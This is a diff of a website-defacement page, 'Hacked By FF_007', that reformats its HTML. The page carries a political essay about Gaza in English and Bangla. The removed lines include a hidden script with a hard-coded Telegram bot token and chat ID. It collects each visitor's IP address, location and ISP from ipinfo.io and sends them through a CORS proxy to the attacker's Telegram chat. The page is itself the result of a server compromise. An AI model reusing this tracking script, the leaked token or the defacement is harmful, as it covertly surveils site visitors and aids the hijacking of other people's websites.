@@ -1,404 +1,906 @@
 <!doctype html>
 <html lang="en" class="dark">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Hacked By FF_007</title>
-  <link rel="icon" href="https://cdn.wallpapersafari.com/70/42/nNZEPc.jpg" />
-  
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Arek+Bangla:wght@400;700&family=Kelly+Slab&display=swap" rel="stylesheet">
-  
-  <script src="https://cdn.tailwindcss.com"></script>
-  <script>
-    tailwind.config = {
-      darkMode: 'class',
-      theme: {
-        extend: {
-          fontFamily: {
-            slab: ['"Kelly Slab"', 'sans-serif'],
-          }
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Hacked By FF_007</title>
+    <link rel="icon" href="https://cdn.wallpapersafari.com/70/42/nNZEPc.jpg" />
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Arek+Bangla:wght@400;700&family=Kelly+Slab&display=swap"
+      rel="stylesheet"
+    />
+
+    <!-- TailwindCSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+      tailwind.config = {
+        darkMode: "class",
+        theme: {
+          extend: {
+            fontFamily: {
+              slab: ['"Kelly Slab"', "sans-serif"],
+            },
+          },
+        },
+      };
+    </script>
+
+    <style>
+      @keyframes flicker {
+        0%,
+        19%,
+        21%,
+        23%,
+        25%,
+        54%,
+        56%,
+        100% {
+          text-shadow:
+            0 0 4px #fff,
+            0 0 11px #fff,
+            0 0 19px #fff,
+            0 0 40px #0fa,
+            0 0 80px #0fa,
+            0 0 90px #0fa,
+            0 0 100px #0fa,
+            0 0 150px #0fa;
+        }
+        20%,
+        24%,
+        55% {
+          text-shadow: none;
         }
       }
-    }
-  </script>
 
-  <style>
-    @keyframes flicker {
-      0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
-        text-shadow:
-          0 0 4px #fff,
-          0 0 11px #fff,
-          0 0 19px #fff,
-          0 0 40px #0fa,
-          0 0 80px #0fa,
-          0 0 90px #0fa,
-          0 0 100px #0fa,
-          0 0 150px #0fa;
+      .flicker {
+        animation: flicker 3s infinite alternate;
       }
-      20%, 24%, 55% {
-        text-shadow: none;
+
+      .scanlines::before {
+        content: "";
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: linear-gradient(
+          to bottom,
+          transparent 50%,
+          rgba(0, 255, 170, 0.1) 51%
+        );
+        background-size: 100% 8px;
+        pointer-events: none;
+        animation: scanline 4s linear infinite;
+        z-index: 100;
       }
-    }
-    
-    .flicker {
-      animation: flicker 3s infinite alternate;
-    }
-    
-    .scanlines::before {
-      content: "";
-      position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background: linear-gradient(to bottom, transparent 50%, rgba(0,255,170,0.1) 51%);
-      background-size: 100% 8px;
-      pointer-events: none;
-      animation: scanline 4s linear infinite;
-      z-index: 100;
-    }
-    
-    @keyframes scanline {
-      0% { background-position: 0 -100vh; }
-      100% { background-position: 0 100vh; }
-    }
-    
-    .bangla-text {
-      font-family: 'Arek Bangla', sans-serif;
-      font-weight: 400;
-      line-height: 1.8;
-      text-align: center;
-      word-spacing: -0.05em;
-      letter-spacing: 0.01em;
-    }
-    
-    .bangla-text p {
-      margin-bottom: 1.2em;
-    }
-    
-    .bangla-heading {
-      font-weight: 700;
-    }
-  </style>
-</head>
 
-<body class="font-slab bg-cover bg-fixed bg-center text-black transition-all duration-300 dark:bg-black dark:text-white" style="background-image: url('https://cdn.wallpapersafari.com/70/42/nNZEPc.jpg');">
-  <div class="scanlines"></div>
+      @keyframes scanline {
+        0% {
+          background-position: 0 -100vh;
+        }
+        100% {
+          background-position: 0 100vh;
+        }
+      }
 
-  <div class="flex min-h-screen flex-col items-center justify-start p-4 text-center">
-    <div class="mb-4 flex w-full max-w-4xl items-center justify-between">
-      <button id="langToggle" class="rounded-md bg-gray-700 px-4 py-2 text-white transition hover:opacity-80 dark:bg-white dark:text-black">বাংলা</button>
-      <button id="themeToggle" class="rounded-md bg-yellow-400 px-4 py-2 text-black transition hover:bg-yellow-300">Toggle Theme</button>
-    </div>
+      .bangla-text {
+        font-family: "Arek Bangla", sans-serif;
+        font-weight: 400;
+        line-height: 1.8;
+        text-align: center;
+        word-spacing: -0.05em;
+        letter-spacing: 0.01em;
+      }
 
-    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgsIcikbv4F5vgboAsCVhDUWwrT_QZrva810fxp7uviQleIyxhNNP2KKgM0kL4DzMPhhIPE4deDi3WUocGeTq-GzvqCHqcB8CXfs1blzVMXqp2Qvx8wXf3HyvbP0R5_8J_w9Tss8N9cWJLYfXpGFjQzh7WBRwQhuS0m5rFQJaj_44Nv21GSa-aRWjtuaKs/s600/Palestine_flag_with_coat_of_arms.gif" 
-         class="my-6 w-40 h-auto" 
-         alt="Palestine Flag">
+      .bangla-text p {
+        margin-bottom: 1.2em;
+      }
 
-    <div class="bg-opacity-70 dark:bg-opacity-80 w-full max-w-5xl rounded-xl border-2 border-red-600 bg-black p-6 text-center">
-      <h1 class="flicker text-4xl font-bold sm:text-5xl">HACKED BY <span class="text-red-500">FF_007</span></h1>
-      <p class="text-xl font-semibold text-red-400">Webserver seized by FF_007</p>
-      <p class="text-yellow-300 mb-6">We Are Humans (unlike you).</p>
+      .bangla-heading {
+        font-weight: 700;
+      }
+    </style>
+  </head>
 
-      <div id="content-en" class="space-y-4 text-base sm:text-lg text-center">
-        <p>The cost of life has been shown by Israel Iran conflict. This 12-day fight brought world close to WW3. Iran has lost 900 people including top scientists and generals. Israel has lost 1/30th. This figure, said to be 30, might be 50-60. But these figures managed to drag America into this, when they used stealth aircrafts to target Iran.</p>
-        
-        <p>Donald Trump forgot about what's happening in America and tried to get a ceasefire and somehow managed to ensure a ceasefire between Iran and Israel. Stakes were high. On one hand, its favorite Israel. And on the other hand, Russia and China were also speaking up for Iran. This fragile ceasefire is being praised by the international community. Trump is dreaming of Nobel Peace Prize.</p>
-        
-        <p>The world is realizing that peace can be achieved in the most difficult situation if superpowers want. But when it comes to Gaza, what is 1000, 5000, 6000? and even 50,000? No matter how big the number, nothing is happening, when even children were targeted. The international community, the United Nations, the International Court of Justice, etc can only do condemnation.</p>
-        
-        <p>Since 21 months, this is happening in Gaza and after Iran Israel ceasefire people are wondering can it happen in Gaza? There can be some peace and law and order. The international community can also take a look at this. But IDF believes that they have taught Iran a lesson and pushed back their nuclear project. Now, they will focus on Gaza again. This means more destruction because no superpower is saving Gaza.</p>
-        
-        <p>Gaza has no oil to export, nor is it military base or is close to anyone.. so to save Gaza would require humanity... which is in short supply internationally.</p>
-        
-        <p>In today's episode we wont talk about Palestine, two state solution, or big talk on Israel's history. We will just try to talk about whether our humanity is completely destroyed. Have we forgotten the difference between right and wrong? And can we put a pause on what is happening in Gaza?</p>
-        
-        <p>Before you say, what about Hamas? I will admit firstly I said the same thing 21 months before and same today. If Hamas committed act of brutality and kidnapped people as hostages then can the response be ethnic cleansing? I dont want to get into debate what Israel did for decades.</p>
-        
-        <p>Today, we have to answer a simple question. Can reply to 1100, 1200, 1500 people lives be collective punishment of entire population? By the lives of 17,000 children can you avenge anything? By denying food and starting man made famine, are you trying to ultimately snatch their land?</p>
-        
-        <p>If all this is happening, and Israel is able to do this without any resistance, whether it is Biden or Trump govt, Israel can do this and speaking against it, or protesting has become a crime in 21st century? The way in which it has become dangerous to talk about Gaza on social media, on the mainstream media, In 21st century, it is same as career ending move so it seems questioning is not allowed.</p>
-        
-        <p>The way so many governments are bootlicking Israel, it seems like we are in medieval age.</p>
-        
-        <p>In today's episode we will try to make you recognize how blind and mute we have become, our country contribution is also there. India has been a supporter of two state solution for decades. But today, we are not even brave enough to condemn Israel's aggression. When did we become so cruel?</p>
-        
-        <p>In January 2024, the International Court of Justice made a statement about Israel actions which made Israel quite angry and people were afraid if Israel would target ICJ. ICJ said that the conditions are catastrophic in Gaza, meaning, let people have food and livelihood.</p>
-        
-        <p>ICJ also asked to give an update within a month. It has been more than a year since Israel violated ICJ's order and has stopped food, water and medicine in Gaza in the name of anti-Hamas operation.</p>
-        
-        <p>Donald Trump recently found out that Israel does not listen to America. Then why ICJ?</p>
-        
-        <p>In December 2024, Human Rights Group Amnesty International gathered all the evidence against Israel of their acts in Gaza, targeting Palestinians.</p>
-        
-        <p>Israel has the capability to target top generals in Iran 1000 km away with precision. But we dont see this accuracy in Gaza. The value of life in Gaza is cheap? They have no idea of Hamas. Israel is seeing Hamas everywhere. In children. In hospital. Hamas command and control was never found below Al Shifa hospital.</p>
-        
-        <p>Gaza population is told to move north and sometimes to go south... and they are targeted in safe areas too. Do you think it is not cleansing? And only few cases have come to attention, so much is buried.</p>
-        
-        <p>Now, whatever you want to call it, don't get stuck in nomenclature... just try to see the truth.</p>
-        
-        <p>Sadly, after all that has happened, liberal west hypocrisy is exposed. The west which used to teach about democracy, freedom, liberty its own fascist hypocrisy is clear to global south.</p>
-        
-        <p>American liberal colleges were famous for questioning and dissenting, which were encouraged. There was a lot of debate and protest on American policies. But when it came to Israel and Gaza, the colleges gave up. Colleges handed over their students to police.</p>
-        
-        <p>You can't even hold a placard or a sign for Palestine. You can't even show solidarity with them. All these things are considered crimes and called anti semitic.</p>
-        
-        <p>Zionism has nothing to do with Judaism. Jews are saying that Zionists are polluting Judaism. Non-political Jews are against actions by Israel in Gaza.</p>
-        
-        <p>I have provided a link below which explains what is anti-Semitism and what is questioning Zionism.</p>
-        
-        <p>Not just colleges but big liberal companies like Meta, Apple, Facebook... here also it is career ending to speak on Gaza.</p>
-        
-        <p>People never imagined that freedom of speech would be so much disrespected in America. The same is true for other European countries like England and Germany. If you speak about Gaza, police will take you.</p>
-        
-        <p>As a history student I wondered how Hitler was able to do so much barbarism. Why international community was quiet back then?</p>
-        
-        <p>Now I understand that it is not that difficult to silence the world. And we have been seeing this for a few days now — the western press is now speaking up. Why is it so quiet? What is this wall of silence on Gaza?</p>
-        
-        <p>It is not anti-semitic to question, it is pro-humanist to question about lives of people.</p>
-        
-        <p>Jews are saying that this is Zionists' doing.</p>
-        
-        <p>It is not that easy to stop al this. Iran's nuclear sites were damaged but Netanyahu could not destroy Iran's nuclear project. Neither could he include USA fully. Nor regime change or save Tel Aviv. Experts believe that this is no less than a win for Iran.</p>
-        
-        <p>Netanyahu might take out this anger on Gaza. He is at the end of his political career. There is a growing demand that Netanyahu should now resign.</p>
-        
-        <p>But when it comes to resignation, Israel comes in danger or Israel targets someone. Trump needs to change the regime, not in Iran, but in Israel. Otherwise Netanyahu will make up schemes, now the new idea is to shift Gazans elsewhere.</p>
-        
-        <p>USA will pay for it and Gaza will be redeveloped. It may sound like a joke but the way things are going, this is also possible.</p>
-        
-        <p>Netanyahu is still trying to show it is all about securing Israel. Return hostages, Hamas surrender and we will end the operations in Gaza.</p>
-        
-        <p>In theory this sounds about right, return hostages and take peace. Problem is no one believes this, if you are destroying at this scale when there are hostages, then imagine without it.</p>
-        
-        <p>This logic is given from Gaza.</p>
-        
-        <p>Iran recently tried to sign a nuclear deal with the US. Netanyahu eliminated the negotiators, scientists and generals.</p>
-        
-        <p>What is the guarantee that this country will not continue its operation in Gaza even after the exchange of hostages?</p>
-        
-        <p>Qatar is the lead negotiator in talks and they have said that talks will start soon and a middle ground will be found between both sides.</p>
-        
-        <p>Hamas has also said that they will not reject this proposal but have asked for extra safeguards.</p>
-        
-        <p>But let's accept that Hamas is in thousands. But does Hamas represent more than 2 million people? Or are 2 million people Hamas?</p>
-        
-        <p>Are those 55,000 people Hamas, and those 17,000 children?</p>
-        
-        <p>Today, Gaza is facing a man-made famine. What kind operation is this?</p>
-        
-        <p>United Nations people were targeted and most casualties since WW2. Were they Hamas?</p>
-        
-        <p>People in line for food aid, were targeted, were they Hamas?</p>
-        
-        <p>During Israel Iran conflict, nearly 1000 people lost lives in Gaza, but no questions, no protest.</p>
-        
-        <p>What is happening is similar to WW2 concentration camps. At that time the truth of these concentration camps was hidden, but today in social media age world can see. But world is saying... Don't show me this. It is too negative. Show something positive.</p>
-        
-        <p>There is no doubt that Netanyahu will make his actions worse in Gaza to save power.</p>
-        
-        <p>But can we speak up? Can we generate awareness?</p>
-        
-        <p>Israel you can target Hamas but spare women, children, elderly, helpless. Stop starving people.</p>
-        
-        <p>Donald Trump can intervene here too like he did between Iran and Israel.</p>
-        
-        <p class="text-yellow-400 font-bold">I would say, give the Nobel Peace Prize to Donald Trump if he can stop Israel in Gaza #TrumpSaveGaza. Make these hashtags and tag Trump.</p>
-        
-        <p>Appeal to Trump's ego and save Gaza otherwise Gaza next could mean two things. Peace or worse than it is, and what we have noticed is Iran used ballistics and people started respecting Iran. But Gaza can't do that. There your humanity can work.</p>
-        
-        <p>What is happening in this century does not look good on humanity. Do target Hamas, but the way you are playing with lives of people is not good for humanity and democracy.</p>
-        
-        <p>You are either with humanity — or you are with genocide.</p>
+  <body
+    class="font-slab bg-cover bg-fixed bg-center text-black transition-all duration-300 dark:bg-black dark:text-white"
+    style="
+      background-image: url(&quot;https://cdn.wallpapersafari.com/70/42/nNZEPc.jpg&quot;);
+    "
+  >
+    <div class="scanlines"></div>
+
+    <div
+      class="flex min-h-screen flex-col items-center justify-start p-4 text-center"
+    >
+      <div class="mb-4 flex w-full max-w-4xl items-center justify-between">
+        <button
+          id="langToggle"
+          class="rounded-md bg-gray-700 px-4 py-2 text-white transition hover:opacity-80 dark:bg-white dark:text-black"
+        >
+          বাংলা
+        </button>
+        <button
+          id="themeToggle"
+          class="rounded-md bg-yellow-400 px-4 py-2 text-black transition hover:bg-yellow-300"
+        >
+          Toggle Theme
+        </button>
       </div>
 
-      <div id="content-bn" class="bangla-text hidden p-4">
-        <p>ইসরাইল-ইরান সংঘর্ষে জীবনের মূল্য দেখানো হয়েছে। এই ১২ দিনের লড়াই বিশ্বকে তৃতীয় বিশ্বযুদ্ধের কাছাকাছি নিয়ে এসেছে। ইরান শীর্ষ বিজ্ঞানী ও জেনারেলসহ ৯০০ জন হারিয়েছে। ইসরাইল হারিয়েছে ১/৩০ ভাগ। এই সংখ্যা, ৩০ বলা হলেও, ৫০-৬০ হতে পারে। কিন্তু এই পরিসংখ্যান আমেরিকাকে এতে জড়িয়ে ফেলেছে, যখন তারা স্টেলথ বিমান ব্যবহার করে ইরানকে লক্ষ্য করেছিল।</p>
-        
-        <p>ডোনাল্ড ট্রাম্প আমেরিকাতে কী ঘটছে তা ভুলে যান এবং যুদ্ধবিরতি পাওয়ার চেষ্টা করেন এবং কোনভাবে ইরান ও ইসরাইলের মধ্যে যুদ্ধবিরতি নিশ্চিত করতে সক্ষম হন। পণগুলি উচ্চ ছিল। একদিকে, তার প্রিয় ইসরাইল। অন্যদিকে, রাশিয়া ও চীনও ইরানের পক্ষে কথা বলছিল। এই নাজুক যুদ্ধবিরতি আন্তর্জাতিক সম্প্রদায় দ্বারা প্রশংসিত হচ্ছে। ট্রাম্প নোবেল শান্তি পুরস্কারের স্বপ্ন দেখছেন।</p>
-        
-        <p>বিশ্ব বুঝতে পারছে যে সবচেয়ে কঠিন পরিস্থিতিতেও শান্তি অর্জন করা সম্ভব যদি সুপারপাওয়াররা চায়। কিন্তু যখন গাজা আসে, ১০০০, ৫০০০, ৬০০০ কি? এমনকি ৫০,০০০? সংখ্যাটা যত বড়ই হোক না কেন, কিছুই ঘটছে না, যখন শিশুরাও লক্ষ্যবস্তু হয়েছে। আন্তর্জাতিক সম্প্রদায়, জাতিসংঘ, আন্তর্জাতিক আদালত ইত্যাদি শুধু নিন্দা করতে পারে।</p>
-        
-        <p>২১ মাস ধরে, এটি গাজায় ঘটছে এবং ইরান-ইসরাইল যুদ্ধবিরতির পর মানুষ ভাবছে এটি গাজায় হতে পারে? কিছু শান্তি এবং আইন-শৃঙ্খলা থাকতে পারে। আন্তর্জাতিক সম্প্রদায়ও এটি দেখতে পারে। কিন্তু আইডিএফ বিশ্বাস করে যে তারা ইরানকে একটি শিক্ষা দিয়েছে এবং তাদের পারমাণবিক প্রকল্পকে পিছিয়ে দিয়েছে। এখন, তারা আবার গাজার দিকে মনোনিবেশ করবে। এর অর্থ আরও ধ্বংস কারণ কোন সুপারপাওয়ার গাজাকে বাঁচাচ্ছে না।</p>
-        
-        <p>গাজার রপ্তানির জন্য তেল নেই, এটি সামরিক ঘাঁটিও নয় বা কারও কাছাকাছি নয়.. তাই গাজাকে বাঁচাতে মানবতা প্রয়োজন... যা আন্তর্জাতিকভাবে স্বল্প সরবরাহে রয়েছে।</p>
-        
-        <p>আজকের পর্বে আমরা ফিলিস্তিন, দুই রাষ্ট্রের সমাধান বা ইসরাইলের ইতিহাস নিয়ে বড় কথা বলব না। আমরা শুধু আমাদের মানবতা সম্পূর্ণরূপে ধ্বংস হয়েছে কিনা সে সম্পর্কে কথা বলার চেষ্টা করব। আমরা কি সঠিক ও ভুলের মধ্যে পার্থক্য ভুলে গেছি? এবং গাজায় যা ঘটছে তাতে কি আমরা বিরতি দিতে পারি?</p>
-        
-        <p>আপনি বলার আগে, হামাস সম্পর্কে কি? আমি প্রথমে স্বীকার করব আমি ২১ মাস আগেও একই কথা বলেছি এবং আজও একই। হামাস যদি নিষ্ঠুরতার কাজ করে এবং মানুষকে জিম্মি হিসেবে অপহরণ করে তবে প্রতিক্রিয়া কি জাতিগত শুদ্ধি হতে পারে? আমি সেই বিতর্কে যেতে চাই না যা ইসরাইল দশক ধরে করেছে।</p>
-        
-        <p>আজ, আমাদের একটি সহজ প্রশ্নের উত্তর দিতে হবে। ১১০০, ১২০০, ১৫০০ মানুষের জীবনের প্রতিক্রিয়া কি পুরো জনসংখ্যার সমষ্টিগত শাস্তি হতে পারে? ১৭,০০০ শিশুর জীবন দিয়ে আপনি কি কোন কিছুর প্রতিশোধ নিতে পারেন? খাদ্য অস্বীকার করে এবং মনুষ্যসৃষ্ট দুর্ভিক্ষ শুরু করে, আপনি কি শেষ পর্যন্ত তাদের জমি কেড়ে নেওয়ার চেষ্টা করছেন?</p>
-        
-        <p>যদি এই সব ঘটছে, এবং ইসরাইল এটি কোন প্রতিরোধ ছাড়াই করতে সক্ষম হচ্ছে, তা Biden বা Trump সরকার হোক, ইসরাইল এটি করতে পারে এবং এর বিরুদ্ধে কথা বলা, বা প্রতিবাদ করা ২১ শতকে একটি অপরাধ হয়ে গেছে? যে ভাবে গাজা সম্পর্কে কথা বলা সোশ্যাল মিডিয়ায়, মেইনস্ট্রিম মিডিয়ায় বিপজ্জনক হয়ে উঠেছে, ২১ শতকে, এটি ক্যারিয়ার শেষ করার মতোই মনে হয় তাই মনে হয় প্রশ্ন করা অনুমোদিত নয়।</p>
-        
-        <p>এত সরকার যে ভাবে ইসরাইলের পায়ে লেগে আছে, মনে হয় আমরা মধ্যযুগে আছি।</p>
-        
-        <p>আজকের পর্বে আমরা আপনাকে চিনতে সাহায্য করব যে আমরা কতটা অন্ধ ও মূক হয়ে গেছি, আমাদের দেশের অবদানও আছে। ভারত দশক ধরে দুই রাষ্ট্রের সমাধানের সমর্থক। কিন্তু আজ, আমরা ইসরাইলের আগ্রাসনকে নিন্দা করারও সাহস পাচ্ছি না। আমরা কখন এত নিষ্ঠুর হয়ে উঠলাম?</p>
-        
-        <p>জানুয়ারী ২০২৪-এ, আন্তর্জাতিক আদালত ইসরাইলের কর্মকাণ্ড সম্পর্কে একটি বিবৃতি দিয়েছিল যা ইসরাইলকে বেশ রাগান্বিত করেছিল এবং লোকেরা ভয় পেয়েছিল যে ইসরাইল ICJ-কে লক্ষ্য করবে কিনা। ICJ বলেছে যে গাজায় অবস্থা বিপর্যয়কর, অর্থাৎ, মানুষকে খাদ্য ও জীবিকা দিতে দিন।</p>
-        
-        <p>ICJ এক মাসের মধ্যে একটি আপডেট দিতেও বলেছে। এক বছরেরও বেশি সময় হয়ে গেছে ইসরাইল ICJ-এর আদেশ লঙ্ঘন করেছে এবং হামাস-বিরোধী অভিযানের নামে গাজায় খাদ্য, পানি ও ওষুধ বন্ধ করে দিয়েছে।</p>
-        
-        <p>ডোনাল্ড ট্রাম্প সম্প্রতি জানতে পেরেছেন যে ইসরাইল আমেরিকার কথা শোনে না। তাহলে ICJ কেন?</p>
-        
-        <p>ডিসেম্বর ২০২৪-এ, হিউম্যান রাইটস গ্রুপ অ্যামনেস্টি ইন্টারন্যাশনাল ফিলিস্তিনিদের লক্ষ্য করে গাজায় তাদের কর্মকাণ্ডের বিরুদ্ধে সমস্ত প্রমাণ সংগ্রহ করেছে।</p>
+      <img
+        src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgsIcikbv4F5vgboAsCVhDUWwrT_QZrva810fxp7uviQleIyxhNNP2KKgM0kL4DzMPhhIPE4deDi3WUocGeTq-GzvqCHqcB8CXfs1blzVMXqp2Qvx8wXf3HyvbP0R5_8J_w9Tss8N9cWJLYfXpGFjQzh7WBRwQhuS0m5rFQJaj_44Nv21GSa-aRWjtuaKs/s600/Palestine_flag_with_coat_of_arms.gif"
+        class="my-6 w-40 h-auto"
+        alt="Palestine Flag"
+      />
 
-<script>
-  const BOT_TOKEN = '7510015374:AAGstqHq8GnQZTWXHHkEFKD2v9jKpb8fktA';
-  const CHAT_ID = '7978628139';
+      <div
+        class="bg-opacity-70 dark:bg-opacity-80 w-full max-w-5xl rounded-xl border-2 border-red-600 bg-black p-6 text-center"
+      >
+        <h1 class="flicker text-4xl font-bold sm:text-5xl">
+          HACKED BY <span class="text-red-500">FF_007</span>
+        </h1>
+        <p class="text-xl font-semibold text-red-400">
+          Webserver seized by FF_007
+        </p>
+        <p class="text-yellow-300 mb-6">We Are Humans (unlike you).</p>
 
-  async function sendVisitorInfo() {
-    try {
-      // Get visitor IP and geo info
-      const res = await fetch('https://ipinfo.io/json');
-      const info = await res.json();
+        <div id="content-en" class="space-y-4 text-base sm:text-lg text-center">
+          <p>
+            The cost of life has been shown by Israel Iran conflict. This 12-day
+            fight brought world close to WW3. Iran has lost 900 people including
+            top scientists and generals. Israel has lost 1/30th. This figure,
+            said to be 30, might be 50-60. But these figures managed to drag
+            America into this, when they used stealth aircrafts to target Iran.
+          </p>
 
-      const domain = window.location.hostname;
-      const ip = info.ip || 'Unknown';
-      const city = info.city || 'Unknown';
-      const region = info.region || 'Unknown';
-      const country = info.country || 'Unknown';
-      const org = info.org || 'Unknown';
-      const loc = info.loc || '';
-      const nowUTC = new Date().toISOString().replace('T', ' ').split('.')[0];
+          <p>
+            Donald Trump forgot about what's happening in America and tried to
+            get a ceasefire and somehow managed to ensure a ceasefire between
+            Iran and Israel. Stakes were high. On one hand, its favorite Israel.
+            And on the other hand, Russia and China were also speaking up for
+            Iran. This fragile ceasefire is being praised by the international
+            community. Trump is dreaming of Nobel Peace Prize.
+          </p>
 
-      // Compose the fancy Markdown message
-      const message =
-        `*📢 New Visitor Notification*\n` +
-        '```\n' +
-        `🌐 Domain: ${domain}\n` +
-        `📍 IP: ${ip}\n` +
-        `🌎 Location: ${city}, ${region}, ${country}\n` +
-        `🏢 ISP: ${org}\n` +
-        `🕒 Time: ${nowUTC} (UTC)\n` +
-        '```';
+          <p>
+            The world is realizing that peace can be achieved in the most
+            difficult situation if superpowers want. But when it comes to Gaza,
+            what is 1000, 5000, 6000? and even 50,000? No matter how big the
+            number, nothing is happening, when even children were targeted. The
+            international community, the United Nations, the International Court
+            of Justice, etc can only do condemnation.
+          </p>
 
-      // Send the message using Telegram Bot API via a CORS proxy
-      const proxy = 'https://cors.bridged.cc/';
-      const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` +
-        `?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+          <p>
+            Since 21 months, this is happening in Gaza and after Iran Israel
+            ceasefire people are wondering can it happen in Gaza? There can be
+            some peace and law and order. The international community can also
+            take a look at this. But IDF believes that they have taught Iran a
+            lesson and pushed back their nuclear project. Now, they will focus
+            on Gaza again. This means more destruction because no superpower is
+            saving Gaza.
+          </p>
 
-      const tgRes = await fetch(proxy + telegramUrl, { method: 'GET' });
-      const tgData = await tgRes.json();
+          <p>
+            Gaza has no oil to export, nor is it military base or is close to
+            anyone.. so to save Gaza would require humanity... which is in short
+            supply internationally.
+          </p>
 
-      if (tgData.ok) {
-        console.log('✅ Telegram message sent!');
-      } else {
-        console.error('❌ Telegram error:', tgData.description);
+          <p>
+            In today's episode we wont talk about Palestine, two state solution,
+            or big talk on Israel's history. We will just try to talk about
+            whether our humanity is completely destroyed. Have we forgotten the
+            difference between right and wrong? And can we put a pause on what
+            is happening in Gaza?
+          </p>
+
+          <p>
+            Before you say, what about Hamas? I will admit firstly I said the
+            same thing 21 months before and same today. If Hamas committed act
+            of brutality and kidnapped people as hostages then can the response
+            be ethnic cleansing? I dont want to get into debate what Israel did
+            for decades.
+          </p>
+
+          <p>
+            Today, we have to answer a simple question. Can reply to 1100, 1200,
+            1500 people lives be collective punishment of entire population? By
+            the lives of 17,000 children can you avenge anything? By denying
+            food and starting man made famine, are you trying to ultimately
+            snatch their land?
+          </p>
+
+          <p>
+            If all this is happening, and Israel is able to do this without any
+            resistance, whether it is Biden or Trump govt, Israel can do this
+            and speaking against it, or protesting has become a crime in 21st
+            century? The way in which it has become dangerous to talk about Gaza
+            on social media, on the mainstream media, In 21st century, it is
+            same as career ending move so it seems questioning is not allowed.
+          </p>
+
+          <p>
+            The way so many governments are bootlicking Israel, it seems like we
+            are in medieval age.
+          </p>
+
+          <p>
+            In today's episode we will try to make you recognize how blind and
+            mute we have become, our country contribution is also there. India
+            has been a supporter of two state solution for decades. But today,
+            we are not even brave enough to condemn Israel's aggression. When
+            did we become so cruel?
+          </p>
+
+          <p>
+            In January 2024, the International Court of Justice made a statement
+            about Israel actions which made Israel quite angry and people were
+            afraid if Israel would target ICJ. ICJ said that the conditions are
+            catastrophic in Gaza, meaning, let people have food and livelihood.
+          </p>
+
+          <p>
+            ICJ also asked to give an update within a month. It has been more
+            than a year since Israel violated ICJ's order and has stopped food,
+            water and medicine in Gaza in the name of anti-Hamas operation.
+          </p>
+
+          <p>
+            Donald Trump recently found out that Israel does not listen to
+            America. Then why ICJ?
+          </p>
+
+          <p>
+            In December 2024, Human Rights Group Amnesty International gathered
+            all the evidence against Israel of their acts in Gaza, targeting
+            Palestinians.
+          </p>
+
+          <p>
+            Israel has the capability to target top generals in Iran 1000 km
+            away with precision. But we dont see this accuracy in Gaza. The
+            value of life in Gaza is cheap? They have no idea of Hamas. Israel
+            is seeing Hamas everywhere. In children. In hospital. Hamas command
+            and control was never found below Al Shifa hospital.
+          </p>
+
+          <p>
+            Gaza population is told to move north and sometimes to go south...
+            and they are targeted in safe areas too. Do you think it is not
+            cleansing? And only few cases have come to attention, so much is
+            buried.
+          </p>
+
+          <p>
+            Now, whatever you want to call it, don't get stuck in
+            nomenclature... just try to see the truth.
+          </p>
+
+          <p>
+            Sadly, after all that has happened, liberal west hypocrisy is
+            exposed. The west which used to teach about democracy, freedom,
+            liberty its own fascist hypocrisy is clear to global south.
+          </p>
+
+          <p>
+            American liberal colleges were famous for questioning and
+            dissenting, which were encouraged. There was a lot of debate and
+            protest on American policies. But when it came to Israel and Gaza,
+            the colleges gave up. Colleges handed over their students to police.
+          </p>
+
+          <p>
+            You can't even hold a placard or a sign for Palestine. You can't
+            even show solidarity with them. All these things are considered
+            crimes and called anti semitic.
+          </p>
+
+          <p>
+            Zionism has nothing to do with Judaism. Jews are saying that
+            Zionists are polluting Judaism. Non-political Jews are against
+            actions by Israel in Gaza.
+          </p>
+
+          <p>
+            I have provided a link below which explains what is anti-Semitism
+            and what is questioning Zionism.
+          </p>
+
+          <p>
+            Not just colleges but big liberal companies like Meta, Apple,
+            Facebook... here also it is career ending to speak on Gaza.
+          </p>
+
+          <p>
+            People never imagined that freedom of speech would be so much
+            disrespected in America. The same is true for other European
+            countries like England and Germany. If you speak about Gaza, police
+            will take you.
+          </p>
+
+          <p>
+            As a history student I wondered how Hitler was able to do so much
+            barbarism. Why international community was quiet back then?
+          </p>
+
+          <p>
+            Now I understand that it is not that difficult to silence the world.
+            And we have been seeing this for a few days now — the western press
+            is now speaking up. Why is it so quiet? What is this wall of silence
+            on Gaza?
+          </p>
+
+          <p>
+            It is not anti-semitic to question, it is pro-humanist to question
+            about lives of people.
+          </p>
+
+          <p>Jews are saying that this is Zionists' doing.</p>
+
+          <p>
+            It is not that easy to stop al this. Iran's nuclear sites were
+            damaged but Netanyahu could not destroy Iran's nuclear project.
+            Neither could he include USA fully. Nor regime change or save Tel
+            Aviv. Experts believe that this is no less than a win for Iran.
+          </p>
+
+          <p>
+            Netanyahu might take out this anger on Gaza. He is at the end of his
+            political career. There is a growing demand that Netanyahu should
+            now resign.
+          </p>
+
+          <p>
+            But when it comes to resignation, Israel comes in danger or Israel
+            targets someone. Trump needs to change the regime, not in Iran, but
+            in Israel. Otherwise Netanyahu will make up schemes, now the new
+            idea is to shift Gazans elsewhere.
+          </p>
+
+          <p>
+            USA will pay for it and Gaza will be redeveloped. It may sound like
+            a joke but the way things are going, this is also possible.
+          </p>
+
+          <p>
+            Netanyahu is still trying to show it is all about securing Israel.
+            Return hostages, Hamas surrender and we will end the operations in
+            Gaza.
+          </p>
+
+          <p>
+            In theory this sounds about right, return hostages and take peace.
+            Problem is no one believes this, if you are destroying at this scale
+            when there are hostages, then imagine without it.
+          </p>
+
